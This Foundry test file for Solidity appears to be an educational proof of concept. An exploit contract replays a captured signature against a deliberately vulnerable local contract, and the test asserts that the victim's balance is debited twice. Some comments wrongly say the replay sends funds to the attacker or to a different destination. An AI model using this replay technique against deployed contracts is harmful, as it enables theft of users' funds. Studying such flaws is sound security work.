// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SignatureReplayAttack.sol";

contract SignatureReplayExploit {
    VulnerableReplay public target;

    constructor(address _target) {
        target = VulnerableReplay(_target);
    }

    function replayAttack(
        address from,
        address to,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        // Reuse the signature to transfer tokens to the attacker's address
        target.transfer(from, to, amount, v, r, s);
    }
}

contract SignatureReplayTest is Test {
    VulnerableReplay public target;
    SignatureReplayExploit public attacker;
    uint256 constant INITIAL_BALANCE = 100 ether;
    uint256 constant TRANSFER_AMOUNT = 10 ether;

    function setUp() public {
        target = new VulnerableReplay();
        attacker = new SignatureReplayExploit(address(target));
    }

    function testReplayAttack() public {
        // Setup addresses
        (address from, uint256 fromPk) = makeAddrAndKey("from");
        (address to, ) = makeAddrAndKey("to");

        // Setup initial state
        vm.deal(from, INITIAL_BALANCE);
        vm.prank(from);
        target.deposit{value: INITIAL_BALANCE}();

        // Verify initial state
        assertEq(
            target.getbalance(from),
            INITIAL_BALANCE,
            "Wrong initial balance"
        );
        assertEq(target.getbalance(to), 0, "Recipient should start with 0");

        // Create signature
        bytes32 messageHash = keccak256(
            abi.encodePacked(from, to, TRANSFER_AMOUNT)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            fromPk,
            keccak256(
                abi.encodePacked(
                    "\x19Ethereum Signed Message:\n32",
                    messageHash
                )
            )
        );

        // Execute legitimate transfer
        vm.prank(from);
        target.transfer(from, to, TRANSFER_AMOUNT, v, r, s);

        // Verify first transfer
        assertEq(
            target.getbalance(from),
            INITIAL_BALANCE - TRANSFER_AMOUNT,
            "First transfer failed"
        );
        assertEq(
            target.getbalance(to),
            TRANSFER_AMOUNT,
            "Recipient balance wrong after first transfer"
        );

        // Execute replay attack
        attacker.replayAttack(from, to, TRANSFER_AMOUNT, v, r, s);

        // Verify replay attack succeeded
        assertEq(
            target.getbalance(from),
            INITIAL_BALANCE - (2 * TRANSFER_AMOUNT),
            "Replay attack failed"
        );
        assertEq(
            target.getbalance(to),
            2 * TRANSFER_AMOUNT,
            "Recipient balance wrong after replay"
        );

        // Log final state
        console.log("Initial balance:", INITIAL_BALANCE);
        console.log("Final victim balance:", target.getbalance(from));
        console.log("Final recipient balance:", target.getbalance(to));
        console.log("Amount stolen:", 2 * TRANSFER_AMOUNT);
    }
}

// contract SignatureReplayTest is Test {
//     VulnerableReplay public target;
//     SignatureReplayExploit public attacker;

//     function setUp() public {
//         target = new VulnerableReplay();
//         attacker = new SignatureReplayExploit(address(target));
//     }

//     function testReplayAttack() public {
//         // Generate keys and addresses
//         (address from, uint256 fromPk) = makeAddrAndKey("from");
//         (address to, ) = makeAddrAndKey("to");
//         address attackerAddress = address(0x333);

//         // Fund the victim
//         vm.deal(from, 100 ether);

//         // Deposit funds
//         vm.prank(from);
//         target.deposit{value: 100 ether}();

//         uint256 fromBal = target.getbalance(from);
//         console.log("Initial From Balance: ", fromBal);

//         // Create and sign the message for a legitimate transfer
//         uint256 amount = 10 ether;
//         bytes32 message = keccak256(abi.encodePacked(from, to, amount));
//         bytes32 ethSignedMessage = keccak256(
//             abi.encodePacked("\x19Ethereum Signed Message:\n32", message)
//         );

//         (uint8 v, bytes32 r, bytes32 s) = vm.sign(fromPk, ethSignedMessage);

//         // Perform legitimate transfer
//         vm.prank(from);
//         target.transfer(from, to, amount, v, r, s);

//         console.log("Balance after legitimate transfer:");
//         console.log("From balance: ", target.getbalance(from));
//         console.log("To balance: ", target.getbalance(to));

//         // Now perform the replay attack with the SAME signature but different destination
//         // The key is to use the ORIGINAL message parameters to ensure signature validity
//         attacker.replayAttack(from, to, amount, v, r, s);

//         console.log("\nBalance after replay attack:");
//         console.log("From balance: ", target.getbalance(from));
//         console.log("To balance: ", target.getbalance(to));
//         console.log("Attacker balance: ", target.getbalance(attackerAddress));
//     }
// }
